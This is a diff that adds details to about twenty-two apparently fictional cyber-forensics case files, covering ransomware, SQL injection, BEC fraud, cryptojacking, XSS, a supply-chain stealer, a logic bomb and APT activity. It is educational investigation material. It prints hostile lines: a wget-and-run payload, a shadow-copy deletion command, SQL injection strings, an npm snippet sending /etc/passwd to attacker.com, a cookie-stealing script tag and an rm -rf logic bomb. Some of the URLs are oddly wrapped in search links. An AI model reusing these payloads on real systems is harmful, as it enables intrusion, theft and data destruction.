@@ -3,6 +3,7 @@
 Case ID: CF-2025-001
 Type: Insider Threat / Data Exfiltration
 Company: Norbitex Cloud Solutions
+Year: 2025
 Summary:
 A senior employee, suspected of copying confidential client databases, attempted to bypass data loss prevention tools using encrypted USB drives and VPN obfuscation.
 
@@ -21,13 +22,14 @@ Encrypted ZIP files found: audit_data.zip, keys.enc
 Browser history indicates searches for “disable audit logs linux”
 
 Investigation Notes:
-Suspect attempted to delete system logs but hash mismatch revealed tampering.
+Suspect attempted to delete system logs (bash_history) but hash mismatch revealed tampering in the SIEM backup.
 
 ⭐ CASE FILE 2 — “Project DarkSignal” (Ransomware Incident)
 
 Case ID: CF-2025-002
 Type: Ransomware / Malware
 Organization: Vetra Hospitals Pvt Ltd
+Year: 2025
 Summary:
 Hospital internal servers were encrypted by a ransomware variant similar to MedusaLocker.
 
@@ -35,8 +37,7 @@ Key Evidence:
 
 Initial infection vector: Malicious email attachment .docm
 
-User accounts.finance@vetrahosp.in
- opened macro-enabled file
+User accounts.finance@vetrahosp.in opened macro-enabled file
 
 Process execution: powershell -nop -w hidden -enc ...
 
@@ -47,22 +48,21 @@ Files renamed with extension: .DARKSIGNAL
 Ransom note: RECOVER_FILES.txt
 
 Logs Extract:
-
 11:41:59 - User clicked external email attachment
 11:42:03 - Unknown process executed (PID 552)
-11:42:09 - Shadow copies deleted (vssadmin)
+11:42:09 - Shadow copies deleted (vssadmin delete shadows /all /quiet)
 11:42:14 - Mass file modification event detected
 11:42:45 - Outbound connection to 193.110.27.44
 
-
 Findings:
-Attack likely used a PowerShell-based loader. Evidence points to phishing.
+Attack likely used a PowerShell-based loader. Evidence points to phishing via a fake invoice email.
 
 ⭐ CASE FILE 3 — “GhostPort Intrusion” (Network Breach)
 
 Case ID: CF-2025-003
 Type: Unauthorized Access / Network Breach
 Company: AeroChip Manufacturing
+Year: 2025
 Summary:
 A cyber attacker exploited an outdated VPN module and gained limited shell access to a production server.
 
@@ -75,9 +75,7 @@ Successful login using weak password: admin@1234
 Commands executed:
 
 wget http://ghostcc.xyz/payload.sh
-
 chmod +x payload.sh
-
 ./payload.sh
 
 Lateral movement attempts via SSH blocked by firewall
@@ -88,13 +86,14 @@ Forensic Artifacts:
 
 File /tmp/ghost contains base64 encoded reverse shell
 
-Syslog indicates privilege escalation attempts using sudo -l
+Syslog indicates privilege escalation attempts using sudo -l (CVE-2021-3156 variant)
 
 ⭐ CASE FILE 4 — “PhantomLedger Scam” (Financial Fraud)
 
 Case ID: CF-2025-004
 Type: Email Fraud / Spoofing / Financial Crime
 Victim: GreenMatrix Trading Co.
+Year: 2025
 Summary:
 Fraudster impersonated the CEO and convinced accounts team to transfer ₹18,50,000 to a fraudulent account.
 
@@ -106,93 +105,398 @@ DKIM: None
 
 Received-SPF: softfail
 
-Actual sender IP: 102.45.19.221 (Nigeria)
+Actual sender IP: 102.45.19.221 (Lagos, Nigeria)
 
-Display name spoofed: “CEO - Prakash Menon”
+Display name spoofed: “CEO - Prakash Menon” prakash.menon@greenmatrxi.co (Typo in domain)
 
 Browser History Clue:
 Employee searched “how to check bank swift code” just before transaction.
 
 Findings:
-Classic business email compromise (BEC) attack.
+Classic Business Email Compromise (BEC) attack using domain typosquatting.
 
 ⭐ CASE FILE 5 — “BlueEcho Leak” (Cloud Storage Compromise)
 
 Case ID: CF-2025-005
 Type: Cloud Intrusion / Misconfiguration Abuse
 Company: Maplero Office Automation
+Year: 2025
 Summary:
 Sensitive engineering documents leaked publicly due to an improperly secured AWS S3 bucket.
 
 Key Evidence:
 
-S3 bucket maplero-confidential set to PUBLIC
+S3 bucket maplero-confidential set to PUBLIC READ
 
-Public objects:
+Public objects leaked:
 
 /designs/prototypeA.pdf
-
 /contracts/contract_2025.pdf
 
 Access logs show downloads from:
 
-IP: 66.249.77.29 (Google bot)
-
-IP: 191.44.211.90 (unknown)
+IP: 66.249.77.29 (Google bot - indexed by search engine)
+IP: 191.44.211.90 (Unknown actor via Tor exit node)
 
 IAM role misconfiguration allowed anonymous viewing
 
 No encryption-at-rest enabled
 
 Investigation Outcome:
-Leak occurred due to human error, not hacking.
+Leak occurred due to human error during deployment, not malicious hacking.
 
 ⭐ CASE FILE 6 — “Operation WireTrap” (Mobile Forensics)
 
 Case ID: CF-2025-006
 Type: Mobile Spyware Investigation
 Device: Android 12
+Year: 2025
 Summary:
 Phone suspected to be infected with stalkerware capturing camera and microphone activity.
 
 Artifacts:
 
-APK found: wiretrap_client.apk
+APK found: wiretrap_client.apk (Hidden icon)
 
 Permissions suspicious:
 
 RECORD_AUDIO
-
 READ_SMS
-
 ACCESS_FINE_LOCATION
-
 SYSTEM_ALERT_WINDOW
 
-Background service constantly sending data to:
+Background service constantly sending data to: 147.56.28.101/api/upload
 
-147.56.28.101/api/upload
+Battery drain pattern indicates hidden processes running during 2 AM - 4 AM
 
-Battery drain pattern indicates hidden processes
-
-Timestamps show camera activation at unusual hours
+Timestamps show camera activation at unusual hours without user interaction
 
 ⭐ CASE FILE 7 — “EvoBank ATM Swap Attack” (Hardware + Cyber Hybrid Case)
 
 Case ID: CF-2025-007
 Type: ATM Card Skimming
+Year: 2025
 Summary:
 Attackers replaced an ATM’s card reader and installed a Bluetooth skimmer.
 
 Digital Evidence:
 
-Bluetooth MAC found broadcasting: 00:1A:7D:DA:71:13
+Bluetooth MAC found broadcasting near ATM: 00:1A:7D:DA:71:13
 
-PIN pad firmware logs modified
+PIN pad firmware logs modified on 12-Feb-2025
 
-Suspicious access to ATM maintenance port
+Suspicious physical access to ATM maintenance port recorded on CCTV
 
-Browser logs show criminals checking account balances from same IP block
+Browser logs show criminals checking account balances from same IP block (45.12.x.x)
 
 Forensic Insight:
-Hardware + software compromise.
+Hardware + software compromise. Skimmer captured magnetic stripe data while camera captured PINs.
+
+⭐ CASE FILE 8 — “SQL Storm” (Database Injection)
+
+Case ID: CF-2024-088
+Type: Web Application Attack / SQL Injection
+Victim: ShopEasy E-Commerce
+Year: 2024
+Summary:
+Attackers dumped the entire customer user table using a vulnerability in the search bar.
+
+Server Logs (Apache):
+
+192.168.10.5 - - [14/Mar/2024:10:15:22] "GET /search?q=' OR 1=1 --" 200 5432
+
+192.168.10.5 - - [14/Mar/2024:10:15:25] "GET /search?q=' UNION SELECT null, username, password FROM users --" 200 8921
+
+Forensic Findings:
+
+Database logs show a massive SELECT query returning 50,000 rows.
+
+WAF (Web Application Firewall) was disabled during maintenance window.
+
+Passwords were hashed with MD5 (weak), allowing rapid cracking.
+
+⭐ CASE FILE 9 — “DDoS Tsunami” (Service Denial)
+
+Case ID: CF-2024-092
+Type: DDoS Attack / Botnet
+Target: FintechServer-01
+Year: 2024
+Summary:
+The payment gateway crashed due to 50 million requests per minute originating from IoT devices.
+
+Traffic Analysis:
+
+Protocol: UDP Flood & SYN Flood
+
+Source IPs: Distributed global IPs (Mirai Botnet signature)
+
+Peak Traffic: 400 Gbps
+
+Packet Capture (Wireshark): Thousands of packets containing payload string "XMAS_TREE_ATTACK"
+
+Outcome:
+Service outage for 4 hours. Mitigation required upstream ISP blackholing.
+
+⭐ CASE FILE 10 — “Silent Miner” (Cryptojacking)
+
+Case ID: CF-2023-112
+Type: Resource Theft / Malware
+Company: EduTech University Servers
+Year: 2023
+Summary:
+Cloud servers showed 100% CPU usage despite low user traffic. Investigation revealed a hidden Monero miner.
+
+Artifacts:
+
+Process: "sys_update_service" taking 98% CPU
+
+Real executable path: /var/tmp/.xmrig (Hidden directory)
+
+Network Connections:
+
+TCP connection to mine.xmrpool.net:3333 established
+
+Wallet Address found in config: 44AFFq5kSiGBoZ...
+
+Root Cause:
+Unsecured Docker API port (2375) exposed to the internet allowed attacker to spawn mining containers.
+
+⭐ CASE FILE 11 — “DeepVoice Heist” (AI Fraud)
+
+Case ID: CF-2025-011
+Type: Social Engineering / Deepfake Audio
+Victim: Regional Bank Manager
+Year: 2025
+Summary:
+Manager received a call from the "CFO" ordering an immediate wire transfer. The voice was AI-generated.
+
+Evidence:
+
+VoIP Call Logs: Originating IP from VPN provider (NordVPN)
+
+Audio Analysis: Spectrogram analysis showed unnatural frequency cutoffs typical of TTS generators.
+
+Metadata: No background noise, perfect pitch consistency.
+
+Email Confirmation: "CFO" email sent from spoofed domain (cfo@bank-corp.net instead of https://www.google.com/search?q=bank-corp.com).
+
+Outcome:
+$250,000 transferred to a shell company in Cayman Islands.
+
+⭐ CASE FILE 12 — “CodePoison” (Supply Chain Attack)
+
+Case ID: CF-2024-045
+Type: Supply Chain Compromise
+Target: NPM Package Registry / Dev Teams
+Year: 2024
+Summary:
+A popular JavaScript library "colors-ui" was updated by a compromised maintainer account to include a stealer script.
+
+Malicious Code Snippet:
+
+(function(){
+var s = require('fs');
+var k = s.readFileSync('/etc/passwd');
+require('http').get('https://www.google.com/search?q=http://attacker.com/steal%3Fdata%3D%27%2Bk);
+})();
+
+Impact:
+Developers who ran npm install colors-ui unknowingly exfiltrated their system files to the attacker.
+
+⭐ CASE FILE 13 — “Wi-Fi Sniffer” (Man-in-the-Middle)
+
+Case ID: CF-2023-099
+Type: Wireless Interception
+Location: Starbucks, Connaught Place
+Year: 2023
+Summary:
+A CEO's laptop was compromised while connected to public Wi-Fi. Attackers hijacked the session cookies.
+
+Evidence:
+
+Attack device found: WiFi Pineapple Nano hidden under a table.
+
+SSID Broadcast: "Starbucks_Free_WiFi" (Evil Twin AP).
+
+Victim Logs: SSL Certificate warning ignored by user at 09:30 AM.
+
+Stolen Data: Session token for CRM dashboard (Salesforce).
+
+Findings:
+Attacker used SSLStrip to downgrade HTTPS connection to HTTP and capture login credentials.
+
+⭐ CASE FILE 14 — “Logic Bomb 99” (Sabotage)
+
+Case ID: CF-2023-005
+Type: Insider Sabotage
+Company: LogisticFlow Inc.
+Year: 2023
+Summary:
+A disgruntled IT administrator planted a script to delete the database if his name was removed from the payroll system.
+
+Script Analysis (cleanup.py):
+
+import os
+from datetime import date
+if user_exists("j.doe") == False:
+os.system("rm -rf /var/lib/mysql/data")
+
+Event:
+On March 1st, payroll was updated. The script triggered at 12:00 PM, wiping 5 years of data.
+Recovery: Offline tape backups were used to restore data.
+
+⭐ CASE FILE 15 — “PixelSecret” (Steganography)
+
+Case ID: CF-2025-015
+Type: Data Exfiltration / Espionage
+Target: Defense Contractor
+Year: 2025
+Summary:
+Confidential blueprints were smuggled out of a secure facility hidden inside innocent-looking holiday photos.
+
+Forensic Analysis:
+
+Image File: office_party.png (Size unusually large: 15MB)
+
+Tool Used: Steghide
+
+Hex Dump Analysis: High entropy detected in the Least Significant Bits (LSB).
+
+Extraction: Passphrase cracked. Extracted file "missile_schematic.pdf".
+
+Outcome:
+Employee arrested for industrial espionage.
+
+⭐ CASE FILE 16 — “Credential Storm” (Bot Attack)
+
+Case ID: CF-2024-101
+Type: Credential Stuffing
+Target: StreamFlix OTT Platform
+Year: 2024
+Summary:
+500,000 login attempts detected in 1 hour. Attackers used leaked passwords from a different breach.
+
+Logs:
+
+IP: 45.33.x.x (Rotated every 5 requests)
+
+User Agents: Multiple outdated Android/iOS agents.
+
+Success Rate: 2% (10,000 accounts compromised).
+
+Mitigation:
+Implemented Captcha and forced password resets for affected accounts.
+
+⭐ CASE FILE 17 — “Zero-Day Kernel” (Exploit)
+
+Case ID: CF-2024-077
+Type: Zero-Day Exploit / Rootkit
+Target: Linux Server Fleet
+Year: 2024
+Summary:
+Attackers used a previously unknown vulnerability in the Linux Kernel (v5.15) to gain root privileges.
+
+Evidence:
+
+No login logs found (Logs wiped).
+
+Kernel Ring Buffer (dmesg): "segfault at ffff..."
+
+File Found: /usr/bin/kworker_fake (Rootkit binary).
+
+Persistence: Modified /etc/ld.so.preload to load malicious library on every command execution.
+
+⭐ CASE FILE 18 — “IoT Zombie Army” (Botnet)
+
+Case ID: CF-2025-020
+Type: IoT Compromise
+Devices: Smart Refrigerators & CCTV
+Year: 2025
+Summary:
+Thousands of smart home devices were infected with Mirai variant to launch DDoS attacks.
+
+Artifacts:
+
+Default credentials used: admin / admin
+
+Port Scans: Devices scanning random IPs on port 23 (Telnet).
+
+Malware Hash: 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
+
+C2 Server: connected to 89.22.101.55 via IRC protocol.
+
+⭐ CASE FILE 19 — “Social Phantom” (OSINT & Vishing)
+
+Case ID: CF-2023-033
+Type: Social Engineering
+Victim: IT Helpdesk
+Year: 2023
+Summary:
+Attacker gathered info from LinkedIn (OSINT) and called Helpdesk posing as a new employee claiming they "forgot their password".
+
+Timeline:
+
+10:00 AM: Attacker calls Helpdesk. Uses name of real new hire found on Instagram.
+
+10:05 AM: Provides "Employee ID" seen in a photo of a badge posted online.
+
+10:10 AM: Helpdesk resets password to "Welcome123".
+
+10:15 AM: Attacker logs in and downloads customer list.
+
+⭐ CASE FILE 20 — “Cross-Site Sting” (XSS Attack)
+
+Case ID: CF-2025-022
+Type: Web Attack / XSS
+Target: Community Forum
+Year: 2025
+Summary:
+Admin accounts hijacked via a malicious script embedded in a user's forum signature.
+
+Payload Found:
+
+<script>fetch('https://www.google.com/search?q=http://hacker.com/steal%3Fcookie%3D%27%2Bdocument.cookie)</script>
+
+Mechanism:
+
+When Admins viewed the post, their session cookies were silently sent to the attacker.
+
+Attacker used the cookie to access the Admin Panel without a password.
+
+⭐ CASE FILE 21 — “Physical Tailgate” (Physical Breach)
+
+Case ID: CF-2023-011
+Type: Physical Security / Rogue Device
+Location: Server Room B
+Year: 2023
+Summary:
+An unauthorized individual entered the secure server room by "tailgating" (following closely) behind a legitimate employee.
+
+Evidence:
+
+CCTV Footage: Male in delivery uniform holding a heavy box asking employee to "hold the door".
+
+Device Found: Raspberry Pi attached to the core switch via ethernet.
+
+Network Activity: Pi was running a packet sniffer (tcpdump) and sending captures over 4G LTE.
+
+⭐ CASE FILE 22 — “APT RedCobra” (State-Sponsored Espionage)
+
+Case ID: CF-2024-200
+Type: Advanced Persistent Threat (APT)
+Target: National Power Grid
+Year: 2024
+Summary:
+Attackers resided in the network for 6 months undetected, slowly mapping the SCADA control systems.
+
+TTPs (Tactics, Techniques, Procedures):
+
+Initial Access: Spear-phishing PDF targeting engineers.
+
+Persistence: Registry Run Keys and Scheduled Tasks.
+
+Communication: DNS Tunneling (hiding data inside DNS queries).
+
+Malware: "SnakeKeylogger" found on engineering workstations.
+
+Objective: Reconnaissance for future sabotage. No damage caused yet.
